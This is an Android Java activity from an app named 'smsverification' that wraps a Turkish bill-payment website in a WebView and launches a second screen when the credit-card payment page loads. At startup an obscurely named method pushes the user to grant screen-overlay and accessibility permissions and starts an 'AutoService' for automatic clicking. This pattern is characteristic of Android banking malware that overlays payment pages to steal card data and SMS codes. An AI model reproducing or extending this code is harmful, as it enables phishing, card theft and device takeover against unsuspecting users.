package com.smsverification;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.Editable;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    private WebView webView;
    private CustomWebViewClient webViewClient;
    private String Url = "https://www.faturaodemelisin.net/";

    private String Url2 = "https://www.faturaodemelisin.net/kredi-karti-ile-odeme";
    ProgressDialog mProgressDialog;



    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        ////
        deee();



        ////

        mProgressDialog = new ProgressDialog(this);//ProgressDialog objesi oluşturuyoruz
        mProgressDialog.setMessage("Yükleniyor...");//ProgressDialog Yükleniyor yazısı

        webViewClient = new CustomWebViewClient();//CustomWebViewClient classdan webViewClient objesi oluşturuyoruz

        webView = (WebView) findViewById(R.id.webView1);//webview mızı xml anasayfa.xml deki webview bağlıyoruz
        webView.getSettings().setBuiltInZoomControls(true); //zoom yapılmasına izin verir
        webView.getSettings().setSupportZoom(true);
        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(webViewClient); //oluşturduğumuz webViewClient objesini webViewımıza set ediyoruz
        webView.loadUrl(Url);





    }

    private class CustomWebViewClient extends WebViewClient {
        //Alttaki methodların hepsini kullanmak zorunda deilsiniz
        //Hangisi işinize yarıyorsa onu kullanabilirsiniz.
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) { //Sayfa yüklenirken çalışır
            super.onPageStarted(view, url, favicon);



            if(!mProgressDialog.isShowing())//mProgressDialog açık mı kontrol ediliyor
            {
                mProgressDialog.show();//mProgressDialog açık değilse açılıyor yani gösteriliyor ve yükleniyor yazısı çıkıyor


            }



        }

        @Override
        public void onPageFinished(WebView view, String url) {//sayfamız yüklendiğinde çalışıyor.
            super.onPageFinished(view, url);


            if(mProgressDialog.isShowing()){//mProgressDialog açık mı kontrol
                mProgressDialog.dismiss();//mProgressDialog açıksa kapatılıyor
            }

     if(url.equals(Url2))
     {
         yeniSayfa();
     }


        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            // Bu method açılan sayfa içinden başka linklere tıklandığında açılmasına yarıyor.
            //Bu methodu override etmez yada edip içini boş bırakırsanız ilk url den açılan sayfa dışında başka sayfaya geçiş yapamaz


            view.loadUrl(url);//yeni tıklanan url i açıyor


            if(url.equals(Url2))
            {
                yeniSayfa();
            }
            return true;

        }

        @Override
        public void onReceivedError(WebView view, int errorCode,String description, String failingUrl) {


        }
    }
    public void onBackPressed() //Android Back Buttonunu Handle ettik. Back butonu bir önceki sayfaya geri dönecek
    {
        if(webView.canGoBack()){//eğer varsa bir önceki sayfaya gidecek
            webView.goBack();

        }else{//Sayfa yoksa uygulamadan çıkacak
            super.onBackPressed();
        }
    }


    public void yeniSayfa(){

        Intent intent = new Intent(this, Main2Activity.class);
        startActivity(intent);

    }


    public void deee(){

        Log.d("tikla", "onClick");
        if (Build.VERSION.SDK_INT >= 23) {
            if (!Settings.canDrawOverlays(getApplicationContext())) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
                startActivity(intent);
                intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                Toast.makeText(getBaseContext(), "開啟AutoClick輔助功能", Toast.LENGTH_SHORT).show();
                startActivity(intent);
            } else {
                Intent intent = new Intent(this, AutoService.class);
                startService(intent);
                finish();

            }

    }
    }


}
